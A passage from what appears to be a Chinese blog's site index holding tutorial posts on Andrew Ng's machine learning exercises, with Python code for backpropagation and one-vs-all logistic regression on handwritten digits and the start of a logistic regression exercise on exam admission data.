d3t.T).T, sigmoid_gradient(z2t))  <span class="comment"># (1, 26)</span></span><br><span class="line">        </span><br><span class="line">        delta1 = delta1 + (d2t[:,<span class="number">1</span>:]).T * a1t</span><br><span class="line">        delta2 = delta2 + d3t.T * a2t</span><br><span class="line">        </span><br><span class="line">    delta1 = delta1 / m</span><br><span class="line">    delta2 = delta2 / m</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># add the gradient regularization term</span></span><br><span class="line">    delta1[:,<span class="number">1</span>:] = delta1[:,<span class="number">1</span>:] + (theta1[:,<span class="number">1</span>:] * learning_rate) / m</span><br><span class="line">    delta2[:,<span class="number">1</span>:] = delta2[:,<span class="number">1</span>:] + (theta2[:,<span class="number">1</span>:] * learning_rate) / m</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># unravel the gradient matrices into a single array</span></span><br><span class="line">    grad = np.concatenate((np.ravel(delta1), np.ravel(delta2)))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> J, grad</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">J, grad = backprop(params, input_size, hidden_size, num_labels, X, y_onehot, learning_rate)</span><br><span class="line">J, grad.shape</span><br></pre></td></tr></table></figure><pre><code>(7.137673923569304, (10285,))</code></pre><p>我们终于准备好训练我们的网络，并用它进行预测。 这与以往的具有多类逻辑回归的练习大致相似。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.optimize <span class="keyword">import</span> minimize</span><br><span class="line"></span><br><span class="line"><span class="comment"># minimize the objective function</span></span><br><span class="line">fmin = minimize(fun=backprop, x0=params, args=(input_size, hidden_size, num_labels, X, y_onehot, learning_rate), </span><br><span class="line">                method=<span class="string">'TNC'</span>, jac=<span class="literal">True</span>, options=&#123;<span class="string">'maxiter'</span>: <span class="number">250</span>&#125;)</span><br><span class="line">fmin</span><br></pre></td></tr></table></figure><pre><code>    fun: 0.36936848574990994    jac: array([-1.94682911e-04,  2.79038111e-06, -8.05264111e-06, ...,      -7.06122696e-04, -9.89911805e-04, -9.76751347e-04])message: &apos;Max. number of function evaluations reached&apos;   nfev: 250    nit: 16 status: 3success: False      x: array([-0.13037322,  0.01395191, -0.04026321, ..., -1.50678966,      -0.13882294, -0.24985413])</code></pre><p>由于目标函数不太可能完全收敛，我们对迭代次数进行了限制。 我们的总代价已经下降到0.5以下，这是算法正常工作的一个很好的指标。 让我们使用它发现的参数，并通过网络转发，以获得一些预测。</p><p>让我们使用它找到的参数，并通过网络前向传播以获得预测。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">X = np.matrix(X)</span><br><span class="line">theta1 = np.matrix(np.reshape(fmin.x[:hidden_size * (input_size + <span class="number">1</span>)], (hidden_size, (input_size + <span class="number">1</span>))))</span><br><span class="line">theta2 = np.matrix(np.reshape(fmin.x[hidden_size * (input_size + <span class="number">1</span>):], (num_labels, (hidden_size + <span class="number">1</span>))))</span><br><span class="line"></span><br><span class="line">a1, z2, a2, z3, h = forward_propagate(X, theta1, theta2)</span><br><span class="line">y_pred = np.array(np.argmax(h, axis=<span class="number">1</span>) + <span class="number">1</span>)</span><br><span class="line">y_pred</span><br></pre></td></tr></table></figure><pre><code>array([[10],       [10],       [10],       ...,       [ 9],       [ 9],       [ 9]], dtype=int64)</code></pre><ul><li>np.argmax测试</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=np.array([[<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>],</span><br><span class="line">           [<span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]])</span><br><span class="line">np.argmax(a, axis=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><pre><code>array([2, 2], dtype=int64)</code></pre><p>最后，我们可以计算准确度，看看我们训练完毕的神经网络效果怎么样。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">correct = [<span class="number">1</span> <span class="keyword">if</span> a == b <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> (a, b) <span class="keyword">in</span> zip(y_pred, y)]</span><br><span class="line">accuracy = (sum(map(int, correct)) / float(len(correct)))</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'accuracy = &#123;0&#125;%'</span>.format(accuracy * <span class="number">100</span>))</span><br></pre></td></tr></table></figure><pre><code>accuracy = 98.34%</code></pre><p>我们已经成功地实施了一个基本的反向传播神经网络，并用它来分类手写数字图像。 在下一个练习中，我们将介绍另一个强大的监督学习算法，支持向量机。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/gdh756462786/article/details/79161525" target="_blank" rel="noopener">one-hot编码</a></li><li><a href="https://www.cnblogs.com/charlotte77/p/5629865.html" target="_blank" rel="noopener">反向传播算法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 神经网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【吴恩达机器学习】练习3-多分类</title>
      <link href="2020/06/23/ML-003%E5%A4%9A%E5%88%86%E7%B1%BB-Exercise3/"/>
      <url>2020/06/23/ML-003%E5%A4%9A%E5%88%86%E7%B1%BB-Exercise3/</url>
      
        <content type="html"><![CDATA[<p>本文运用逻辑回归对手写数字进行分类预测。。。。</p><a id="more"></a><p>该代码涵盖了基于Python的解决方案，用于Coursera机器学习课程的第三个编程练习。 有关详细说明和方程式，请参阅<a href="ex3.pdf">exercise text</a>。</p><h2 id="加载数据集"><a href="#加载数据集" class="headerlink" title="加载数据集"></a>加载数据集</h2><p>对于此练习，我们将使用<strong>逻辑回归来识别手写数字（1到10）</strong>。 我们将扩展我们在练习2中写的逻辑回归的实现，并将其应用于一对一的分类。 让我们开始加载数据集。 <code>.mat</code>文件是在MATLAB的数据存储的标准格式(标准的二进制文件)，要在Python中加载，我们需要使用一个SciPy工具。</p><ul><li>导入相关模块</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> scipy.io <span class="keyword">import</span> loadmat</span><br></pre></td></tr></table></figure><ul><li>加载<code>.mat</code>形式数据集</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = loadmat(<span class="string">'ex3data1.mat'</span>)</span><br><span class="line">data</span><br></pre></td></tr></table></figure><pre><code>{&apos;__header__&apos;: b&apos;MATLAB 5.0 MAT-file, Platform: GLNXA64, Created on: Sun Oct 16 13:09:09 2011&apos;, &apos;__version__&apos;: &apos;1.0&apos;, &apos;__globals__&apos;: [], &apos;X&apos;: array([[0., 0., 0., ..., 0., 0., 0.],        [0., 0., 0., ..., 0., 0., 0.],        [0., 0., 0., ..., 0., 0., 0.],        ...,        [0., 0., 0., ..., 0., 0., 0.],        [0., 0., 0., ..., 0., 0., 0.],        [0., 0., 0., ..., 0., 0., 0.]]), &apos;y&apos;: array([[10],        [10],        [10],        ...,        [ 9],        [ 9],        [ 9]], dtype=uint8)}</code></pre><ul><li>查看数据集的维度及分析</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="string">'X'</span>].shape, data[<span class="string">'y'</span>].shape</span><br></pre></td></tr></table></figure><pre><code>((5000, 400), (5000, 1))</code></pre><p>好的，我们已经加载了我们的数据。图像在martix X中表示为400维向量（其中有5,000个）。 400维“特征”是原始20 x 20图像中每个像素的灰度强度。类标签在向量y中作为表示图像中数字的数字类。</p><p>第一个任务是将我们的逻辑回归实现修改为完全向量化（即没有“for”循环）。这是因为向量化代码除了简洁外，还能够利用线性代数优化，并且通常比迭代代码快得多。但是，如果从练习2中看到我们的代价函数已经完全向量化实现了，所以我们可以在这里重复使用相同的实现。</p><h2 id="sigmoid-函数"><a href="#sigmoid-函数" class="headerlink" title="sigmoid 函数"></a>sigmoid 函数</h2><p>g 代表一个常用的逻辑函数（logistic function）为S形函数（Sigmoid function），公式为： $g\left( z \right)=\frac{1}{1+{{e}^{-z}}}$<br>合起来，我们得到逻辑回归模型的假设函数：<br>    ${{h}_{\theta }}\left( x \right)=\frac{1}{1+{{e}^{-{{\theta }^{T}}X}}}$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义sigmoid函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span><span class="params">(z)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> / (<span class="number">1</span> + np.exp(-z))</span><br></pre></td></tr></table></figure><h2 id="交叉熵损失函数"><a href="#交叉熵损失函数" class="headerlink" title="交叉熵损失函数"></a>交叉熵损失函数</h2><p>代价函数：<br>$J\left( \theta  \right)=\frac{1}{m}\sum\limits_{i=1}^{m}{[-{{y}^{(i)}}\log \left( {{h}_{\theta }}\left( {{x}^{(i)}} \right) \right)-\left( 1-{{y}^{(i)}} \right)\log \left( 1-{{h}_{\theta }}\left( {{x}^{(i)}} \right) \right)]}$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost</span><span class="params">(theta, X, y, learningRate)</span>:</span></span><br><span class="line">    <span class="comment"># 相关数组转换为矩阵</span></span><br><span class="line">    theta = np.matrix(theta)</span><br><span class="line">    X = np.matrix(X)</span><br><span class="line">    y = np.matrix(y)</span><br><span class="line">    </span><br><span class="line">    first = np.multiply(-y, np.log(sigmoid(X * theta.T)))</span><br><span class="line">    second = np.multiply((<span class="number">1</span> - y), np.log(<span class="number">1</span> - sigmoid(X * theta.T)))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 正则化；[:]切片，前者控制行，后这控制列theta.shape[1]为列数</span></span><br><span class="line">    reg = (learningRate / (<span class="number">2</span> * len(X))) * np.sum(np.power(theta[:,<span class="number">1</span>:theta.shape[<span class="number">1</span>]], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> np.sum(first - second) / len(X) + reg</span><br></pre></td></tr></table></figure><h2 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h2><p>如果我们要使用梯度下降法令这个代价函数最小化，因为我们未对${{\theta }_{0}}$ 进行正则化，所以梯度下降算法将分两种情形：</p><p>$Repeat$  $until$  $convergence${</p><p>​                                                   ${\theta_0}:={\theta_0}-a\frac{1}{m}\sum\limits_{i=1}^{m}{(({h_\theta}({{x}^{(i)}})-{{y}^{(i)}})x_{0}^{(i)}})$</p><p>​                                                  ${\theta_j}:={\theta_j}-a[\frac{1}{m}\sum\limits_{i=1}^{m}{({h_\theta}({{x}^{(i)}})-{{y}^{(i)}})x_{j}^{\left( i \right)}}+\frac{\lambda }{m}{\theta_j}]$</p><p>​                                                 $for$ $j=1,2,…n$</p><p>​                                                 }</p><ul><li>以下是原始代码是使用for循环的梯度函数：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradient_with_loop</span><span class="params">(theta, X, y, learningRate)</span>:</span></span><br><span class="line">    theta = np.matrix(theta)</span><br><span class="line">    X = np.matrix(X)</span><br><span class="line">    y = np.matrix(y)</span><br><span class="line">    </span><br><span class="line">    parameters = int(theta.ravel().shape[<span class="number">1</span>]) <span class="comment"># ravel矩阵向量化</span></span><br><span class="line">    grad = np.zeros(parameters)  <span class="comment">#返回来一个给定形状和类型的用0填充的数组</span></span><br><span class="line">    </span><br><span class="line">    error = sigmoid(X * theta.T) - y</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(parameters):</span><br><span class="line">        term = np.multiply(error, X[:,i])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>):</span><br><span class="line">            grad[i] = np.sum(term) / len(X)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            grad[i] = (np.sum(term) / len(X)) + ((learningRate / len(X)) * theta[:,i])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> grad</span><br></pre></td></tr></table></figure><ul><li>向量化的梯度函数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradient</span><span class="params">(theta, X, y, learningRate)</span>:</span></span><br><span class="line">    theta = np.matrix(theta)</span><br><span class="line">    X = np.matrix(X)</span><br><span class="line">    y = np.matrix(y)</span><br><span class="line">    </span><br><span class="line">    parameters = int(theta.ravel().shape[<span class="number">1</span>])</span><br><span class="line">    error = sigmoid(X * theta.T) - y</span><br><span class="line">    </span><br><span class="line">    grad = ((X.T * error) / len(X)).T + ((learningRate / len(X)) * theta)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># intercept gradient is not regularized</span></span><br><span class="line">    grad[<span class="number">0</span>, <span class="number">0</span>] = np.sum(np.multiply(error, X[:,<span class="number">0</span>])) / len(X)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> np.array(grad).ravel()</span><br></pre></td></tr></table></figure><h2 id="分类器构造"><a href="#分类器构造" class="headerlink" title="分类器构造"></a>分类器构造</h2><p>现在我们已经定义了代价函数和梯度函数，现在是构建分类器的时候了。 对于这个任务，我们有10个可能的类，并且由于逻辑回归只能一次在2个类之间进行分类，我们需要多类分类的策略。 在本练习中，我们的任务是实现一对一全分类方法，其中具有k个不同类的标签就有k个分类器，每个分类器在“类别 i”和“不是 i”之间决定。 我们将把分类器训练包含在一个函数中，该函数计算10个分类器中的每个分类器的最终权重，并将权重返回为$k *X（n + 1）$数组，其中n(特征数量）是参数数量，k是k个分类器。</p><ul><li>向量化标签<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20706vectorlabel01.png" alt=""></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.optimize <span class="keyword">import</span> minimize</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_vs_all</span><span class="params">(X, y, num_labels, learning_rate)</span>:</span></span><br><span class="line">    rows = X.shape[<span class="number">0</span>]</span><br><span class="line">    params = X.shape[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># k X (n + 1) array for the parameters of each of the k classifiers</span></span><br><span class="line">    <span class="comment"># k个分类器的每个参数的k个X (n + 1)数组</span></span><br><span class="line">    all_theta = np.zeros((num_labels, params + <span class="number">1</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># insert a column of ones at the beginning for the intercept term</span></span><br><span class="line">    <span class="comment"># 在X的开头插入一列截距项“1”</span></span><br><span class="line">    X = np.insert(X, <span class="number">0</span>, values=np.ones(rows), axis=<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># labels are 1-indexed instead of 0-indexed</span></span><br><span class="line">    <span class="comment"># 标签是1索引，代替0索引</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, num_labels + <span class="number">1</span>):</span><br><span class="line">        theta = np.zeros(params + <span class="number">1</span>)</span><br><span class="line">        y_i = np.array([<span class="number">1</span> <span class="keyword">if</span> label == i <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> label <span class="keyword">in</span> y])</span><br><span class="line">        y_i = np.reshape(y_i, (rows, <span class="number">1</span>)) <span class="comment"># 将y_i变成rows行1列的数组</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># minimize the objective function</span></span><br><span class="line">        <span class="comment"># 最小化目标函数</span></span><br><span class="line">        <span class="comment"># fun 求最小值的目标函数/代价函数，x0初始化的theta,args常数值,method求极值方法，jac该参数就是计算梯度的函数</span></span><br><span class="line">        fmin = minimize(fun=cost, x0=theta, args=(X, y_i, learning_rate), method=<span class="string">'TNC'</span>, jac=gradient)</span><br><span class="line">        all_theta[i<span class="number">-1</span>,:] = fmin.x</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> all_theta</span><br></pre></td></tr></table></figure><p>这里需要注意的几点：首先，我们为theta添加了一个额外的参数（与训练数据一列），以计算截距项（常数项）。 其次，我们将y从类标签转换为每个分类器的二进制值（要么是类i，要么不是类i）。 最后，我们使用SciPy的较新优化API来最小化每个分类器的代价函数。 如果指定的话，API将采用目标函数，初始参数集，优化方法和jacobian（渐变）函数。 然后将优化程序找到的参数分配给参数数组。</p><p>实现向量化代码的一个更具挑战性的部分是正确地写入所有的矩阵，保证维度正确。</p><ul><li>针对加载的数据集，进行简单的维度分析</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rows = data[<span class="string">'X'</span>].shape[<span class="number">0</span>] <span class="comment"># 行数</span></span><br><span class="line">params = data[<span class="string">'X'</span>].shape[<span class="number">1</span>] <span class="comment"># 列数</span></span><br><span class="line"></span><br><span class="line">all_theta = np.zeros((<span class="number">10</span>, params + <span class="number">1</span>)) <span class="comment"># 10为标签数</span></span><br><span class="line"></span><br><span class="line">X = np.insert(data[<span class="string">'X'</span>], <span class="number">0</span>, values=np.ones(rows), axis=<span class="number">1</span>) <span class="comment"># 在X第一列前添加一列1</span></span><br><span class="line"></span><br><span class="line">theta = np.zeros(params + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">y_0 = np.array([<span class="number">1</span> <span class="keyword">if</span> label == <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> label <span class="keyword">in</span> data[<span class="string">'y'</span>]])</span><br><span class="line">y_0 = np.reshape(y_0, (rows, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">X.shape, y_0.shape, theta.shape, all_theta.shape</span><br></pre></td></tr></table></figure><pre><code>((5000, 401), (5000, 1), (401,), (10, 401))</code></pre><p>注意，theta是一维数组，因此当它被转换为计算梯度的代码中的矩阵时，它变为（1×401）矩阵。 我们还检查y中的类标签，以确保它们看起来像我们想象的一致。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#numpy unique（）保留数组中不同的值</span></span><br><span class="line">np.unique(data[<span class="string">'y'</span>])<span class="comment">#看下有几类标签</span></span><br></pre></td></tr></table></figure><pre><code>array([ 1,  2,  3,  4,  5,  6,  7,  8,  9, 10], dtype=uint8)</code></pre><ul><li>利用开始加载的数据集，让我们确保我们的训练函数正确运行，并且得到合理的输出。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">all_theta = one_vs_all(data[<span class="string">'X'</span>], data[<span class="string">'y'</span>], <span class="number">10</span>, <span class="number">1</span>)</span><br><span class="line">all_theta</span><br></pre></td></tr></table></figure><pre><code>array([[-2.38208691e+00,  0.00000000e+00,  0.00000000e+00, ...,         1.30384042e-03, -6.14427666e-10,  0.00000000e+00],       [-3.18352842e+00,  0.00000000e+00,  0.00000000e+00, ...,         4.46123909e-03, -5.08642939e-04,  0.00000000e+00],       [-4.79735416e+00,  0.00000000e+00,  0.00000000e+00, ...,        -2.87309679e-05, -2.47481807e-07,  0.00000000e+00],       ...,       [-7.98467966e+00,  0.00000000e+00,  0.00000000e+00, ...,        -8.97640711e-05,  7.23641521e-06,  0.00000000e+00],       [-4.57003568e+00,  0.00000000e+00,  0.00000000e+00, ...,        -1.33433208e-03,  1.00011405e-04,  0.00000000e+00],       [-5.40502829e+00,  0.00000000e+00,  0.00000000e+00, ...,        -1.16485909e-04,  7.85363055e-06,  0.00000000e+00]])</code></pre><p>我们现在准备好最后一步 - 使用训练完毕的分类器预测每个图像的标签。 对于这一步，我们将计算每个类的类概率，对于每个训练样本（使用当然的向量化代码），并将输出类标签为具有最高概率的类。</p><ul><li>进行预测</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict_all</span><span class="params">(X, all_theta)</span>:</span></span><br><span class="line">    rows = X.shape[<span class="number">0</span>]</span><br><span class="line">    params = X.shape[<span class="number">1</span>]</span><br><span class="line">    num_labels = all_theta.shape[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># same as before, insert ones to match the shape</span></span><br><span class="line">    <span class="comment"># 同样在X的开头插入一列截距项“1”</span></span><br><span class="line">    X = np.insert(X, <span class="number">0</span>, values=np.ones(rows), axis=<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># convert to matrices</span></span><br><span class="line">    <span class="comment"># 转换为矩阵</span></span><br><span class="line">    X = np.matrix(X)</span><br><span class="line">    all_theta = np.matrix(all_theta)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># compute the class probability for each class on each training instance</span></span><br><span class="line">    <span class="comment"># 计算每个训练实例上每个类的类概率</span></span><br><span class="line">    h = sigmoid(X * all_theta.T)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># create array of the index with the maximum probability</span></span><br><span class="line">    <span class="comment"># 创建概率最大的索引数组</span></span><br><span class="line">    h_argmax = np.argmax(h, axis=<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># because our array was zero-indexed we need to add one for the true label prediction</span></span><br><span class="line">    <span class="comment"># 因为我们的数组是零索引的，我们需要为真正的标签预测添加1</span></span><br><span class="line">    h_argmax = h_argmax + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> h_argmax</span><br></pre></td></tr></table></figure><p>现在我们可以使用predict_all函数为每个实例生成类预测，看看我们的分类器是如何工作的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">y_pred = predict_all(data[<span class="string">'X'</span>], all_theta)</span><br><span class="line">correct = [<span class="number">1</span> <span class="keyword">if</span> a == b <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> (a, b) <span class="keyword">in</span> zip(y_pred, data[<span class="string">'y'</span>])]</span><br><span class="line">accuracy = (sum(map(int, correct)) / float(len(correct)))</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'accuracy = &#123;0&#125;%'</span>.format(accuracy * <span class="number">100</span>))</span><br></pre></td></tr></table></figure><pre><code>accuracy = 94.46%</code></pre><p>在下一个练习中，我们将介绍如何从头开始实现前馈神经网络。</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 逻辑回归 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【吴恩达机器学习】练习2-逻辑回归</title>
      <link href="2020/06/16/ML-002%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-Exercise2/"/>
      <url>2020/06/16/ML-002%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-Exercise2/</url>
      
        <content type="html"><![CDATA[<p>本文主要是：通过练习，了解逻辑回归原理以及 代价函数、梯度下降相关理解，应用到分类任务中，正则化训练算法</p><a id="more"></a><p>这个笔记包含了以Python为编程语言的Coursera上机器学习的第二次编程练习。请参考 <a href="ex2.pdf">作业文件</a> 详细描述和方程。<br>在这一次练习中，我们将要实现逻辑回归并且应用到一个分类任务。我们还将通过将正则化加入训练算法，来提高算法的鲁棒性，并用更复杂的情形来测试它。</p><h2 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h2><p>在训练的初始阶段，我们将要构建一个逻辑回归模型来预测，某个学生是否被大学录取。设想你是大学相关部分的管理者，想通过申请学生两次测试的评分，来决定他们是否被录取。现在你拥有之前申请学生的可以用于训练逻辑回归的训练样本集。对于每一个训练样本，你有他们两次测试的评分和最后是被录取的结果。为了完成这个预测任务，我们准备构建一个可以基于两次测试评分来评估录取可能性的分类模型。</p><p>让我们从检查数据开始。</p><ul><li>导入相关包</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br></pre></td></tr></table></figure><ul><li>读取数据，并赋予列属性名</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">'ex2data1.txt'</span></span><br><span class="line">data = pd.read_csv(path, header=<span class="literal">None</span>, names=[<span class="string">'Exam 1'</span>, <span class="string">'Exam 2'</span>, <span class="string">'Admitted'</span>])</span><br></pre></td></tr></table></figure><ul><li>查看前五行</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Exam 1</th>      <th>Exam 2</th>      <th>Admitted</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>34.623660</td>      <td>78.024693</td>      <td>0</td>    </tr>    <tr>      <td>1</td>      <td>30.286711</td>      <td>43.894998</td>      <td>0</td>    </tr>    <tr>      <td>2</td>      <td>35.847409</td>      <td>72.902198</td>      <td>0</td>    </tr>    <tr>      <td>3</td>      <td>60.182599</td>      <td>86.308552</td>      <td>1</td>    </tr>    <tr>      <td>4</td>      <td>79.032736</td>      <td>75.344376</td>      <td>1</td>    </tr>  </tbody></table></div><ul><li>创建两个分数的散点图，并使用颜色编码来可视化，如果样本是正的（被接纳）或负的（未被接纳）。</li></ul><figure class="highlight python"><table><tr><td 